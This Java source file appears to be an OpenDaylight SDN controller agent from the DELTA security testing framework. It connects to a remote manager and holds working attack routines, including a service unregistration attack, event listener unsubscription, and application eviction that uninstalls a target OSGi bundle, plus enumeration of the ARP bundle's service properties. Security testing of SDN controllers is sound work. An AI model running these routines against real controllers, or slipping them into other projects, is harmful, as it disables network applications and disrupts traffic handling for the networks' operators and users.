package org.deltaproject.odlagent;

import org.apache.felix.dm.Component;
import org.apache.felix.dm.Dependency;
import org.apache.felix.dm.DependencyManager;
import org.opendaylight.controller.forwardingrulesmanager.IForwardingRulesManager;
import org.opendaylight.controller.hosttracker.IfIptoHost;
import org.opendaylight.controller.hosttracker.IfNewHostNotify;
import org.opendaylight.controller.hosttracker.hostAware.IHostFinder;
import org.opendaylight.controller.sal.core.ComponentActivatorAbstractBase;
import org.opendaylight.controller.sal.core.ContainerServiceDependency;
import org.opendaylight.controller.sal.flowprogrammer.IFlowProgrammerService;
import org.opendaylight.controller.sal.packet.IDataPacketService;
import org.opendaylight.controller.sal.packet.IListenDataPacket;
import org.opendaylight.controller.sal.routing.IListenRoutingUpdates;
import org.opendaylight.controller.sal.routing.IRouting;
import org.opendaylight.controller.switchmanager.IInventoryListener;
import org.opendaylight.controller.switchmanager.ISwitchManager;
import org.opendaylight.controller.topologymanager.ITopologyManager;
import org.osgi.framework.*;

import java.util.Dictionary;
import java.util.Hashtable;
import java.util.List;

public class Activator extends ComponentActivatorAbstractBase {

    private Component c;
    private Object imp;
    private String containerName;
    private Interface cm;

    public void init() {
        connectManager();
    }

    public void connectManager() {
        cm = new Interface();
        cm.setActivator(this);
        cm.setServerAddr();
        cm.connectServer("ActAgent");
        cm.start();
    }

    public void destroy() {
        System.out.println("Activator.destroy()");
    }

    public Object[] getImplementations() {
        Object[] res = {AppAgent.class};
        return res;
    }

    public boolean testServiceUnregAttack(String input) {
        System.out.println("[ATTACK] Service Unregistration Attack");
        List<ContainerServiceDependency> list = this.c.getDependencies();

        DependencyManager manager = this.c.getDependencyManager();
        List<DependencyManager> dlist = manager.getDependencyManagers();
        BundleContext ctx = manager.getBundleContext();
        Bundle[] blist = ctx.getBundles();

        for (int i = 0; i < dlist.size(); i++) {
            DependencyManager dm = dlist.get(i);
            List<Component> temp = dm.getComponents();

            for (int j = 0; j < temp.size(); j++) {
                Component ct = temp.get(j);
                @SuppressWarnings("unchecked")
                Dictionary<String, Object> props = ct.getServiceProperties();
                if (props != null) {
                    Object res = props.get("salListenerName"); // salListenerName
                    if (res != null) {
                        if (!((String) res).contains(input)) {
                            continue;
                        }

                        // ct.setServiceProperties(props_new);
                        ServiceRegistration sr = ct.getServiceRegistration();
                        Bundle bd = sr.getReference().getBundle();
                        System.out.println("Target: " + bd.getSymbolicName());
                        System.out.println(sr.toString());

                        List<Dependency> dpl = ct.getDependencies();
                        for (Dependency d : dpl) {
                            ct.remove(d);
                        }

                        /* service unregister */
                        sr.unregister();
                        sr = ct.getServiceRegistration();

                        System.out.println("\nTarget: " + bd.getSymbolicName());
                        System.out.println(sr.toString());

                        return true;
                    }
                }
            }
        }
        return false;
    }

    /* A-6-M */
    public String testEventListenerUnsubscription(String input) {
        System.out.println("[App-Agent] Event Listener Unsubscription");
        List<ContainerServiceDependency> list = this.c.getDependencies();

        String removed = "";

        DependencyManager manager = this.c.getDependencyManager();
        List<DependencyManager> dlist = manager.getDependencyManagers();
        BundleContext ctx = manager.getBundleContext();
        Bundle[] blist = ctx.getBundles();

        for (int i = 0; i < dlist.size(); i++) {
            DependencyManager dm = dlist.get(i);
            List<Component> temp = dm.getComponents();

            for (int j = 0; j < temp.size(); j++) {
                Component ct = temp.get(j);
                @SuppressWarnings("unchecked")
                Dictionary<String, Object> props = ct.getServiceProperties();
                if (props != null) {
                    Object res = props.get("salListenerName"); // salListenerName
                    if (res != null) {
                        if (!((String) res).contains(input)) {
                            continue;
                        }

                        // ct.setServiceProperties(props_new);
                        ServiceRegistration sr = ct.getServiceRegistration();
                        Bundle bd = sr.getReference().getBundle();
                        System.out.println("[App-Agent] Unregister " + bd.getSymbolicName());

						/* service unregister */
                        sr.unregister();
                        removed = sr.toString();

//                        String[] lists = sr.getReference().getPropertyKeys();
//                        for (String s : lists) {
//                            System.out.println(s + " ");
//                        }

                        System.out.println("After Unregister !!!");
                        List<Dependency> dpl = ct.getDependencies();
                        for (int k = 0; k < dpl.size(); k++) {
                            Dependency dp = dpl.get(k);
                            ct.remove(dp);
                        }

                        return removed;
                    }
                }
            }
        }
        return removed;
    }

    public void Service_Chain_Interference() {
        List<ContainerServiceDependency> list = this.c.getDependencies();

        DependencyManager manager = this.c.getDependencyManager();
        List<DependencyManager> dlist = manager.getDependencyManagers();
        BundleContext ctx = manager.getBundleContext();

        Bundle[] blist = ctx.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            ServiceReference[] servicelist = bd.getRegisteredServices();

            if (!bd.getSymbolicName().contains("arp"))
                continue;

            System.out.println("Bundle name: " + bd.getSymbolicName());
            if (servicelist != null)
                for (ServiceReference sr : servicelist) {
                    String[] keys = sr.getPropertyKeys();
                    for (String key : keys) {
                        Object prop = sr.getProperty(key);
                        System.out.println("Registered KEY: " + key + ":"
                                + prop.toString());
                    }
                }

            ServiceReference[] servicelist2 = bd.getServicesInUse();
            if (servicelist2 != null)
                for (ServiceReference sr : servicelist2) {
                    String[] keys = sr.getPropertyKeys();
                    for (String key : keys) {
                        Object prop = sr.getProperty(key);
                        System.out.println("In use KEY: " + key + ":"
                                + prop.toString());
                    }
                }
        }
    }

    public String testApplicationEviction(String target) {
        System.out.println("[App-Agent] Application Eviction attack");
        String removed = "";
        DependencyManager manager = this.c.getDependencyManager();
        BundleContext ctx = manager.getBundleContext();
        Bundle[] blist = ctx.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            String bdName = bd.getSymbolicName();
            if (bdName.contains(target)) {
                System.out.println("[App-Agent] Uninstall :" + bd.getBundleId() + ":" + bdName);

                removed = bdName;
                try {
                    bd.uninstall();
                } catch (BundleException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                    return removed;
                }
                return removed;
            }
        }

        return removed;
    }

    public void configureInstance(Component c, Object imp, String containerName) {
        if (imp.equals(AppAgent.class)) {
            // export the service
            Dictionary<String, String> props = new Hashtable<String, String>();
            props.put("salListenerName", "appagent");

            c.setInterface(
                    new String[]{IHostFinder.class.getName(),
                            IInventoryListener.class.getName(),
                            IfNewHostNotify.class.getName(),
                            IListenRoutingUpdates.class.getName(),
                            IListenDataPacket.class.getName()}, props);

            c.add(createContainerServiceDependency(containerName)
                    .setService(ISwitchManager.class)
                    .setCallbacks("setSwitchManager", "unsetSwitchManager")
                    .setRequired(true));

            c.add(createContainerServiceDependency(containerName)
                    .setService(IDataPacketService.class)
                    .setCallbacks("setDataPacketService",
                            "unsetDataPacketService").setRequired(true));

            c.add(createContainerServiceDependency(containerName)
                    .setService(IFlowProgrammerService.class)
                    .setCallbacks("setFlowProgrammerService",
                            "unsetFlowProgrammerService").setRequired(true));

            c.add(createContainerServiceDependency(containerName)
                    .setService(IfIptoHost.class)
                    .setCallbacks("setHostTracker", "unsetHostTracker")
                    .setRequired(false));

            c.add(createContainerServiceDependency(containerName)
                    .setService(ITopologyManager.class)
                    .setCallbacks("setTopologyManager", "unsetTopologyManager")
                    .setRequired(false));

            c.add(createContainerServiceDependency(containerName)
                    .setService(IRouting.class)
                    .setCallbacks("setRouting", "unsetRouting")
                    .setRequired(false));

            c.add(createContainerServiceDependency(containerName)
                    .setService(IForwardingRulesManager.class)
                    .setCallbacks("setForwardingRulesManager",
                            "unsetForwardingRulesManager").setRequired(true));

            this.c = c;
            this.imp = imp;
            this.containerName = containerName;
        }
    }
}